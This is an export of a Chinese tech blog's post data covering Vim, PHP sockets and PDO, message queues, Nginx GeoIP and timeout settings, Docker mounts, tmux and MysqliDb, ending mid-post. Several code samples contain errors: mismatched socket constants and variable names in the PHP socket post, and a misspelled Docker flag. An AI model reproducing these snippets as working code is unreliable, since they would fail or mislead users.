常用快捷键总结","slug":"summary-of-vim-commonly-used-shortcut-keys","date":"2020-10-16T11:16:43.000Z","updated":"2020-10-18T08:12:31.937Z","comments":true,"path":"summary-of-vim-commonly-used-shortcut-keys/","link":"","permalink":"https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/","excerpt":"Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。","text":"Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。 基本操作 移动到行首：0 移动到行尾：$ 光标移动到文件开始位置：gg 光标移动到文件结束位置: shift + g 删除所有内容：ggdG 单行删除：dd 单行复制：yy 粘贴：p 复制全部内容：ggyG 移动到指定行在vim 中直接移动到指定行数，有三种方式（均是在命令行模式下输入，n 为指定的行号）： ngg/ nG :n vim +n filename 进阶操作当前行替换： 1s&#x2F;XXX&#x2F;YYY&#x2F;g 其中XXX 是需要替换的字符串，YYY是替换后的字符串。 全局替换： 1%s&#x2F;XXX&#x2F;YYY&#x2F;g 一些配置 查找字符设置高亮：set hlsearch 显示行号：set number","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"PHP Socket 编程","slug":"php-socket-programming","date":"2020-10-15T14:29:16.000Z","updated":"2020-10-15T14:30:23.551Z","comments":true,"path":"php-socket-programming/","link":"","permalink":"https://www.0x2beace.com/php-socket-programming/","excerpt":"最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。 关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。","text":"最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。 关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。 什么是 Socket按照惯例，还是先来了解一下基本概念。 我们知道两个进程如果需要进程通讯，最基本的前提就是保证彼此进程的唯一，并能确定彼此身份。在本地进程通讯中我们可以使用 PID 来标示唯一的进程，但 PID 只在本地唯一，网络中的两个进程 PID 冲突的几率很大，这时候我们就需要另辟蹊径了。 我们知道IP 层的IP 地址可以唯一标示主机，而TCP 层协议和端口号可以唯一标示主机的一个进程，这样我们就可以利用 IP 地址+ 协议 + 端口号唯一标示网络中的一个进程。 能够唯一标示网络中的进程后，它们就可以利用socket 进行通信了。 什么是socket？ 我们经常把 socket 翻译成套接字，socket 是在应用层和传输层之间的一个抽象层，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信。 socket 起源于 UNIX，在UNIX 一切皆为文件哲学的思想下，socket 是一种“打开=&gt;读/写=&gt;关闭“模式的实现，服务器和客户端各自维护一个文件，在建立连接打开之后，可以向自己的文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。 socket 通信流程socket 是”打开=&gt;读/写=&gt;关闭”模式的实现，以使用TCP协议通讯的socket为例，其交互流程大概是这样子： 安装PHP 默认没有启用 sockets 扩展，所以需要手动安装扩展。 1apt-get install php7.2-sockets php -m 或者 php -i检查扩展是否已经启用。 创建连接创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务端。 123456&lt;?php# 创建一个TCP 协议的 socket$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);# 创建一个本地的socket$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0); socket_create函数接收三个参数，分别是domain、type、protocol。 domain：当前套接字使用什么协议 type：当前套接字的类型 protocol：设置指定 domain 套接字下的具体协议 发送内容发送数据有两种方式： socket_send：发送消息至已连接的客户端。 socket_sendto：发送消息至客户端，无论是否连接。123456789&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);$msg &#x3D; &quot;Ping !&quot;;$len &#x3D; strlen($msg);&#x2F;&#x2F; 向本地 1223 端口发送内容socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);socket_close($sock); 接收数据接收数据也有两种方式： socket_recv：从已连接的socket 接收数据 socket_recvfrom：从socket 接收数据，无论是否连接 123456&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);# 从本地 1223 端口获取内容socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);var_dump($buf); &#x2F;&#x2F; Ping ! 参考链接 简单理解Socket 一篇搞懂TCP、HTTP、Socket、Socket连接池 socket_create socket_sendto socket_bind","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"}]},{"title":"PHP PDO 快速上手","slug":"php-pdo-quick-start","date":"2020-10-13T23:51:48.000Z","updated":"2020-10-13T23:53:56.113Z","comments":true,"path":"php-pdo-quick-start/","link":"","permalink":"https://www.0x2beace.com/php-pdo-quick-start/","excerpt":"最近用到了 PHP PDO相关的知识，整理总结一下。","text":"最近用到了 PHP PDO相关的知识，整理总结一下。 PDO 是什么？PDO（PHP Data Object） PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。 PDO 能做什么？PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。 在 PHP 使用 MySQL 数据库前，你需要先将它们连接。 PHP 5 及以上版本有两种方式连接 MySQL : MySQLi extension (“i” 意为 improved) PDO (PHP Data Objects) 关于是选择 Mysqli，还是 PDO？ MySQLi 和 PDO 有它们自己的优势：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。 如果项目需要在多种数据库中切换，建议使用 PDO，因为只需要修改连接字符串和部分查询语句即可。 PDO 安装在 PHP5 系列版本中，PDO不是默认支持的，需要手工配置才可以使用。打开 php.ini 文件，开启扩展。 123&#x2F;&#x2F; php.iniextension&#x3D;php_pdo.dllextension&#x3D;php_pdo_mysql.dll 上述配置只打开了对 MySQL 的 PDO 支持，如果需要对别的数据库类型进行支持，可以分别打开对应的不同配置（去掉前面的分号）： 12345;extension&#x3D;php_pdo_oci.dll;extension&#x3D;php_pdo_oci8.dll;extension&#x3D;php_pdo_odbc.dll;extension&#x3D;php_pdo_pgsql.dll;extension&#x3D;php_pdo_sqlite.dll PDO 创建连接在使用 PDO 操作数据库之前，需要创建 PDO 连接对象。 1234new PDO(DSN, username, password);&lt;?php$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;); 不同的数据库，其 DSN(Data Source Name) 构造方式是不一样的。常见数据库 DSN 语法如下： 12345678&#x2F;&#x2F;MySQL:$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)&#x2F;&#x2F;SQLite:$dsn &#x3D; sqlite:db_name&#x2F;&#x2F;PGSQL$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password PDO Mysql 预处理语句预处理语句及绑定参数预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。 预处理语句的工作原理如下： 预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出 执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。 相比于直接执行SQL语句，预处理语句有两个主要优点： 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行） 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句 预处理语句针对SQL注入是非常有用的，因为 参数值发送后使用不同的协议，保证了数据的合法性。 PDO的直接查询和预处理分别是PDO 的 query类和 prepare 类。 PDO::prepare — 备要执行的SQL语句并返回一个 PDOStatement 对象 PDO::query — 执行 SQL 语句，返回PDOStatement对象,可以理解为结果集 前者其实就是执行 sql 语句，返回一个结果集对象（PDOStatement），然后操作 PDOStatement类，从结果集中取出相应的数据。 后者虽然也会返回一个 PDOSTatement 对象，但区别就在于两者的处理方式不同。query 是直接执行 sql 语句，而 prepare 是通过预处理的方式执行 sql 语句（更安全，更高效）。 错误处理PDO 默认开启的是错误码模式，如果发生了错误，只会简单地输出错误码，这对于调试或者测试来说，不是很友好，不利用快速定位异常所在。 所以PDO 还为我们提供了另外两种方式： PDO::ERRMODE_WARNING除设置错误码之外，PDO 还将发出一条传统的 E_WARNING 信息。如果只是想看看发生了什么问题且不中断应用程序的流程，那么此设置在调试/测试期间非常有用。 PDO::ERRMODE_EXCEPTION除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域（记住：如果异常导致脚本终止，则事务被自动回滚）。 创建 PDO 实例并设置错误模式： 1234567891011121314&lt;?php$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;$user &#x3D; &#39;dbuser&#39;;$password &#x3D; &#39;dbpass&#39;;try &#123; $dbh &#x3D; new PDO($dsn, $user, $password); &#x2F;&#x2F; 开启ERRMODE_EXCEPTION 模式 $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);&#125; catch (PDOException $e) &#123; echo &#39;Connection failed: &#39; . $e-&gt;getMessage();&#125;?&gt; 参考链接： PHP PDO PHP PDO-&gt;query类 PHP Mysql 预处理语句 PHP 多种方式连接Mysql","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"}]},{"title":"消息队列快速上手","slug":"quick-start-message-queue","date":"2020-10-11T12:03:16.000Z","updated":"2020-10-13T23:54:23.637Z","comments":true,"path":"quick-start-message-queue/","link":"","permalink":"https://www.0x2beace.com/quick-start-message-queue/","excerpt":"业务场景描述： 订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。 如何及时发现处理失败的订单，然后进行补单处理。 订单所产生佣金的处理。","text":"业务场景描述： 订单创建成功之后，每一笔订单都需要进行统计及其他业务处理。 如何及时发现处理失败的订单，然后进行补单处理。 订单所产生佣金的处理。 困境该应用因为一些历史原因使用 Mysql 的数据表作为消息队列。 整个系统中有多个生产者会向该数据表中插入记录，同时有一个脚本会作为消费者去数据库中查找记录并进行处理。 但是这样做是存在一些问题的： 长时间与数据库保持连接进行查询操作，消耗服务器资源。 在数据量较大或者延时较高的情况下，不能及时处理完，会影响其他业务。 所以更好的方式应该是使用消息队列来解决。 什么是消息队列？消息队列（Message Queue），是分布式系统中重要的组件，其通用的使用场景可以简单地描述为： 当不需要立即获得结果，但是并发量又需要进行控制的时候，差不多就是需要使用消息队列的时候。 常见应用场景其常见的应用场景有以下几个： 应用耦合：多应用间通过消息队列对同一消息进行处理，避免调用接口失败导致整个过程失败； 异步处理：多应用对消息队列中同一消息进行处理，应用间并发处理消息，相比串行处理，减少处理时间； 限流削峰：广泛应用于秒杀或抢购活动中，避免流量过大导致应用系统挂掉的情况； 消息驱动的系统：系统分为消息队列、消息生产者、消息消费者，生产者负责产生消息，消费者(可能有多个)负责对消息进行处理； 1. 异步处理场景描述：用户注册之后，需要邮箱或者短信通知，传统的做法有两种： 串行： 注册成功 发送邮件 发送短信 只有等以上三个任务全部完成之后，才会返回客户端。 并行： 注册成功 发送邮件并同时发送短信 虽然也是需要以上三个任务全部完成才会返回客户端，但并行与串行的区别就在于，通过使用多线程来缩短程序处理时间。 假设三个业务节点每个使用50毫秒钟，不考虑网络等其他开销，则串行方式的时间是150毫秒，并行的时间可能是100毫秒。 因为CPU在单位时间内处理的请求数是一定的，假设CPU1秒内吞吐量是100次。则串行方式1秒内CPU可处理的请求量是7次（1000/150）。并行方式处理的请求量是10次（1000/100）。 就该场景而言，如何突破传统方式带来的性能瓶颈？ 解决方案： 引入消息队列 将不是必须的业务逻辑，加入队列中，进行异步处理。 2. 应用解耦消息队列模式消息队列包括两种模式，点对点模式（point to point， queue）和发布/订阅模式（publish/subscribe，topic）。 点对点模式点对点模式包括以下三个角色： 消息队列 生产者 消费者 生产者将消息发送到队列中，消费者从队列中取出消息进行消费，消息被消费之后，消息不再被存储。 点对点模式的特点： 每个消息只有一个接收者（Consumer）(即一旦被消费，消息就不再在消息队列中)。 生产者和消费者之间没有依赖性，不会因为消费者是否在线，都会存在于队列中。 发布/订阅模式发布/订阅模式下包括三个角色： 频道 发布者 订阅者 发布者将消息发布在频道中，频道将消息传递给所有订阅者。 发布/订阅模式特点： 每个消息可以有多个订阅者 发布者和订阅者之间存在依赖关系，必须先订阅频道，发布者发布的消息才会被订阅者所接收。 因为发布的消息是无状态的，所以订阅者需要订阅频道且在线。 常用消息队列 RabbitMQ ActiveMQ RocketMQ Kafka Redis 参考链接 为什么会需要消息队列(MQ)？ PHP(Mysql/Redis)消息队列的介绍及应用场景案例 消息队列及常见消息队列介绍 PHP大量数据写入文档，如何异步处理？","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"}]},{"title":"Nginx 如何根据 IP 获取地域信息","slug":"how-does-nginx-obtain-geographic-information-based-on-ip","date":"2020-10-08T09:29:34.000Z","updated":"2020-10-11T12:01:45.888Z","comments":true,"path":"how-does-nginx-obtain-geographic-information-based-on-ip/","link":"","permalink":"https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/","excerpt":"最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。","text":"最近有一个需求：需要根据用户的IP 获取其国家，然后根据不同国家进行代理转发。 想要完成这个需求，首先第一个解决的问题就是获取IP 地址所对应的地理位置： 这个需求通常是由 GeoIP 这个模块来完成的，Nginx 默认没有开启该模块。 GeoIP 是基于 maxmind 提供的数据文件进行分析的，所以还需要下载 maxmind 的数据源文件。 安装GeoIP 模块前面也提到了MaxMind GeoLite Legacy数据库目前已停产，应改用MaxMind GeoIP2或Geolite2数据库和NGINX Plus GeoIP2模块。 Centos： 1yum install nginx-plus-module-geoip2 Ubuntu： 1sudo apt-get install nginx-plus-module-geoip2 然后将 load_module 指令都放在nginx.conf 的配置文件的顶部： 123456load_module modules&#x2F;ngx_http_geoip2_module.so;load_module modules&#x2F;ngx_stream_geoip2_module.so;http &#123; ...&#125; 安装 GeoIP 数据源自从 2019年12月30日开始，就不能直接从MaxMind 上下载了，需要先注册一个账号，获取 license key，然后wget 时带上 key。具体可以查阅这篇文章。 这是一种安装方式，如果觉得麻烦，可以尝试下面这种方式。 安装依赖： 123sudo add-apt-repository ppa:maxmind&#x2F;ppasudo apt updatesudo apt install libgeoip1 libgeoip-dev geoip-bin 下载源码包，安装应用： 123456sudo wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;geoip-api-c&#x2F;releases&#x2F;download&#x2F;v1.6.12&#x2F;GeoIP-1.6.12.tar.gzsudo tar -zxvf GeoIP-1.6.12.tar.gzcd GeoIP-1.6.12 &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install 查找GeoIP.dat所在位置： 12sudo find &#x2F; -name GeoIP.dat&#x2F;usr&#x2F;share&#x2F;GeoIP&#x2F;GeoIP.dat 在配置文件中使用： 12345678910geoip_country &#x2F;etc&#x2F;nginx&#x2F;geoip&#x2F;GeoIP-1.6.12&#x2F;data&#x2F;GeoIP.dat;server &#123; ... location &#x2F;myip &#123; default_type text&#x2F;plain; return 200 &quot;$remote_addr $geoip_country_name $geoip_country_code $geoip_city&quot;; &#125;&#125; 通过以下变量综合获取地域信息： $remote_addr：IP地址 $geoip_country_name：国家 $geoip_country_code：对应编码 $geoip_city：城市名称 参考链接 nginx: [emerg] unknown directive “geoip_country” in /etc/nginx/nginx.conf:23 install GeoIP install GeoIP module","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Docker 数据挂载","slug":"docker-data-mount","date":"2020-10-07T12:24:01.000Z","updated":"2020-10-07T12:24:40.708Z","comments":true,"path":"docker-data-mount/","link":"","permalink":"https://www.0x2beace.com/docker-data-mount/","excerpt":"","text":"数据挂载数据挂载在Docker 中还是挺重要的一部分，因为有多种方式，而不同的方式所对应的处理数据的逻辑也不一样。 Volumes：Docker 管理宿主机文件系统的一部分（/var/lib/docker/volumes）。 Bind Mounts：将宿主机上的任意位置的文件或目录挂载到容器中。 tmpfs：挂载存储在主机系统的内存中，而不会写入主机的文件系统。如果不系统将数据持久存储在任何位置，可以使用tmpfs，同时避免写入容器可写层提高性能。 这里主要介绍前两者，后者使用的并不多。注意第一种和第二种是存在区别的，前者是使用的数据卷进行挂载，而后者则是直接使用的宿主机上的文件或者目录挂载到容器中。 众所周知，将容器删除之后，容器内所有的改动将不复存在。 挂载数据卷通常是最常用且最好的方式，这种方式会将容器中的数据持久化在宿主机中，这样做的好处就是当容器被删除或者无法正常启动时，数据仍是完整的。 挂载数据卷有两种方式： 使用--mount 使用-v 前者是新版本的方式，后者是老版本的方式，其效果都是一样的。 Volumes创建一个数据卷： 1docker volume create &lt;volume name&gt; 列出数据卷列表： 1docker volume ls 列出数据卷的详情信息： 1docker volume inspect &lt;volume name&gt; 删除数据卷： 1docker volume rm &lt;volume name&gt; 用数据卷创建一个容器： 123456789# 新版本docker run -d -it \\--name&#x3D;nginx --mount src&#x3D;&lt;volume name&gt;,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# 老版本docker run -d -it \\--name&#x3D;nginx -v &lt;volume name&gt;:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx 需要注意的是： 如果没有指定数据卷，则会自动创建 Bind Mounts使用bind mounts 创建一个容器： 12345678910111213# 新版本docker run -d -it \\--name nginx \\-p 8080:80 \\--mounts type&#x3D;bind,src&#x3D;&#x2F;var&#x2F;www,dst&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx# 老版本docker run -d -it \\--name nginx \\-p 8080:80 \\-v &#x2F;var&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\nginx 需要注意的是： 如果源文件/目录没有存在，docker 不会自动创建，而会自动抛出一个错误。 如果挂载目标在容器中是非空目录，则该目录现有内容将被隐藏。","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"nginx 超时问题——upstream timed out (110: Connection timed out) while reading response header from upstream","slug":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream","date":"2020-10-05T12:28:45.000Z","updated":"2020-10-05T12:29:53.756Z","comments":true,"path":"nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","link":"","permalink":"https://www.0x2beace.com/nginx-timeout-problem-upstream-timed-out-110-Connection-timed-out-while-reading-response-header-from-upstream/","excerpt":"今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。","text":"今天早上起来，发现后台登录不上，打开控制台发现几乎所有请求都超时了。 打开nginx 的异常日志可以看到全是相同的异常： upstream timed out (110: Connection timed out) while reading response header from upstream 从这个异常日志可以分析出，由于nginx 代理去获取上游服务器的响应超时了，那么究竟是什么原因导致它会超时呢？ 通常会导致请求超时可能有以下几个原因： 接口比较复杂，响应时间慢，导致超时。 处理请求的进程异常。 代理服务器与上游服务器的网络问题。 因为请求一直都是那些请求，所以第一种可能性可以排除。另外子进程数量设置的是比较大，所以第二种应该也可以排除。 对于服务器的网络问题，如果条件允许，可以直接从根本上解决，另外也可以通过设置超时时间来延缓请求超时。 在server 中添加以下配置： 1234567891011large_client_header_buffers 4 16k;client_max_body_size 30m;client_body_buffer_size 128k;proxy_connect_timeout 240s;proxy_read_timeout 240s;proxy_send_timeout 240s;proxy_buffer_size 64k;proxy_buffers 4 32k;proxy_busy_buffers_size 64k;proxy_temp_file_write_size 64k; 然后重启Nginx。 参考链接 nginx 设置超时时间-Nginx 官网","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Tmux 快速上手","slug":"tmux-quick-start","date":"2020-10-04T12:39:38.000Z","updated":"2020-10-04T12:41:19.876Z","comments":true,"path":"tmux-quick-start/","link":"","permalink":"https://www.0x2beace.com/tmux-quick-start/","excerpt":"","text":"本来之前就知道有 tmux 这样一个窗口分隔工具，只不过一直使用着iTerm2，本身就自带有标签页功能，所以就一直没去学习这个工具。 这段时间需要经常访问Linux服务器，所以在服务器上安装了这个工具。 安装Mac： 1brew install tmux Linux: 1apt-get install tmux 一般情况下 tmux 中所有的快捷键都需要和前缀快捷键 ⌃b 来组合使用（注：⌃ 为 Mac 的 control 键），以下是常用的窗格（pane）快捷键列表。 会话第一次使用tmux 可能会被Session、窗口、窗格 这些陌生的概念，弄得摸不着头脑。 这里总结成一句话就是：一个完整的会话（Session）是由数个窗口组成，而一个窗口又可以分成若各个窗格。 使用tmux 命令会默认新建一个tmux 会话： 12&#x2F;&#x2F; 默认新建一个Session 名称为 0 的窗口。tmux 常用Session操作： $ 重命名当前会话 s 选择会话列表 d 退出当前会话（不是删除），运行后将会退出 tmux 进程，返回至 shell 主进程。 窗口窗口的概念不同于窗格，窗口互不影响，窗格相互分隔。 常用窗口操作： c 新建窗口，此时当前窗口会切换至新窗口，不影响原有窗口的状态 p 切换至上一窗口 n 切换至下一窗口 w 窗口列表选择，注意 macOS 下使用 ⌃p 和 ⌃n 进行上下选择 &amp; 关闭当前窗口 , 重命名窗口，可以使用中文，重命名后能在 tmux 状态栏更快速的识别窗口 id 0 切换至 0 号窗口，使用其他数字 id 切换至对应窗口 f 根据窗口名搜索选择窗口，可模糊匹配 窗格窗格是在窗口下的概念，若干个窗格组成一个窗口。 常用窗格操作： % 左右平分出两个窗格 “ 上下平分出两个窗格 x 关闭当前窗格 { 当前窗格前移 } 当前窗格后移 ; 选择上次使用的窗格 o 选择下一个窗格，也可以使用上下左右方向键来选择 space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换 z 最大化当前窗格，再次执行可恢复原来大小 q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格 其他命令上面那些命令都是配合⌃ + b快捷键使用的，下面的这些命令都是在Shell进程中直接执行的。 新建名称为 foo 的会话 1tmux new -s foo 列出所有 tmux 会话 1tmux ls 恢复上一次会话 1tmux a 恢复名为 foo 的会话 1tmux a -t foo 删除名为 foo 的会话 1tmux kill -session -t foo 删除所有会话 1tmux kill -server tmux or iterm2tmux 和iTerm2 都有窗口管理方面的功能，只是前者相比后者的优势在于： iTerm2 的窗格切换快捷键（⌘⌥→）容易与其他软件全局快捷键冲突（例如 Spectacle 的窗口分割快捷键），tmux 由于存在前缀快捷键，所以不存在快捷键冲突问题； tmux 可以在终端软件重启后通过命令行恢复上次的 session ，而终端软件则不行； tmux 简洁优雅、订制性强，学会之后也能在 Linux 上使用，有助于逼格提升。 参考链接 Tmux 快捷键&amp;速查表&amp;简明教程 十分钟学会 Tmux [Tmux 快捷键和备忘录](","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Mac","slug":"Linux/Mac","permalink":"https://www.0x2beace.com/categories/Linux/Mac/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"},{"name":"Terminal","slug":"Terminal","permalink":"https://www.0x2beace.com/tags/Terminal/"}]},{"title":"MysqliDb 快速上手","slug":"mysqlidb-is-quick-to-get-started","date":"2020-10-02T07:26:03.000Z","updated":"2020-10-02T07:27:10.385Z","comments":true,"path":"mysqlidb-is-quick-to-get-started/","link":"","permalink":"https://www.0x2beace.com/mysqlidb-is-quick-to-get-started/","excerpt":"","text":"MysqliDb 是基于 mysqli 扩展出来的一个类库，其中封装了很多常用的Mysql 基础操作，相比原生的方式，后者使用起来更加方便。 具有如下特点： 支持链式操作 支持Mysql 函数的使用 … 安装使用composer 安装 1composer require thingengineer&#x2F;mysqli-database-class:dev-master 因为MysqliDb没有命名空间，所以我们想要使用的话，不能自动加载，只能先引入。 1require &quot;MysqliDb.php&quot;; 初始化初始化连接有几种方式： 1. MysqliDb 字符串1$db &#x3D; new MysqliDb (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;); 2. MysqliDb 对象123456789$db &#x3D; new MysqliDb ([ &#39;host&#39; &#x3D;&gt; &#39;host&#39;, &#39;username&#39; &#x3D;&gt; &#39;username&#39;, &#39;password&#39; &#x3D;&gt; &#39;password&#39;, &#39;db&#39;&#x3D;&gt; &#39;databaseName&#39;, &#39;port&#39; &#x3D;&gt; 3306, &#39;prefix&#39; &#x3D;&gt; &#39;my_&#39;, &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;]); 3. mysqli 对象12$mysqli &#x3D; new mysqli (&#39;host&#39;, &#39;username&#39;, &#39;password&#39;, &#39;databaseName&#39;);$db &#x3D; new MysqliDb ($mysqli); 新增向user 表中插入一条记录： 123456$data &#x3D; [ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, &quot;age&quot; &#x3D;&gt; 21, &quot;gender&quot; &#x3D;&gt; &quot;man&quot;];$success &#x3D; $db-&gt;insert(&quot;user&quot;, $data); 返回值类型：bool 修改修改user 表中的一条记录 12345$data &#x3D; [ &quot;age&quot; &#x3D;&gt; 22,];$success &#x3D; $db-&gt;where([&quot;name&quot; &#x3D;&gt; &quot;boo&quot;]) -&gt;update(&quot;user&quot;, $data); 返回值类型：bool 查询获取user 表所有数据：1$result &#x3D; $db-&gt;get(&quot;user&quot;, null, &quot;*&quot;); 返回值：多维数组 获取user 表单条数据：1$result &#x3D; $db-&gt;getOne(&quot;user&quot;, &quot;*&quot;); 返回值：关联数组 获取user 表单个字段的值：12$result &#x3D; $db-&gt;where(&quot;name&quot;, &quot;boo&quot;) -&gt;getValue(&quot;user&quot;, &quot;*&quot;); 返回值：string 获取查询条数：1$result &#x3D; $db-&gt;getValue(&quot;user&quot;, &quot;count(*)&quot;); 删除删除user 表中一条记录 12$success &#x3D; $db-&gt;where(&quot;user_id&quot;, &quot;boo&quot;) -&gt;delete(&quot;user); 运行原生SQL1$result &#x3D; $db-&gt;rawQuery(&quot;select * from user where name &#x3D; \\&quot;boo\\&quot;&quot;) 总体来说，MysqliDb 真的挺好用的，基本上可以满足所有日常需求。这里只是列举了最基本的CURD，更多操作可以参考官网手册。 参考链接joshcam/mysqli-database-class","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mysqli","slug":"Mysqli","permalink":"https://www.0x2beace.com/tags/Mysqli/"}]},{"title":"PHPStrom 高级技巧整理","slug":"phpstorm-advanced-skills-finishing","date":"2020-10-01T02:39:34.000Z","updated":"2020-10-02T07:25:43.207Z","comments":true,"path":"phpstorm-advanced-skills-finishing/","link":"","permalink":"https://www.0x2beace.com/phpstorm-advanced-skills-finishing/","excerpt":"","text":"PHPStrom 是我日常使用频率很高的 IDE。 基础的使用这里就不过多介绍了，这里主要是用来整理一些比较高级的用法。 调试技巧调试是日常开发中，不可缺少的一部分。 路径映射通常都是用来调试本地代码，可如果需要调试虚拟机或者其他应用中时，那该怎么做呢？ 打开偏好设置或者设置，找到一个已经配置好的服务，勾选映射。 然后找到该服务的入口配置文件，后面的文件路径填绝对路径。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"}]},{"title":"递归算法","slug":"recursive-algorithm","date":"2020-09-30T12:21:12.000Z","updated":"2020-10-01T02:39:46.124Z","comments":true,"path":"recursive-algorithm/","link":"","permalink":"https://www.0x2beace.com/recursive-algorithm/","excerpt":"最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。","text":"最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。 最后返回的结果大概是这样： 1234567891011121314151617181920$result &#x3D; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;php&quot;, &quot;sub_id&quot; &#x3D;&gt; [ 0 &#x3D;&gt; [ &quot;user_id&quot; &#x3D;&gt; &quot;python&quot;, &quot;sub_id&quot; 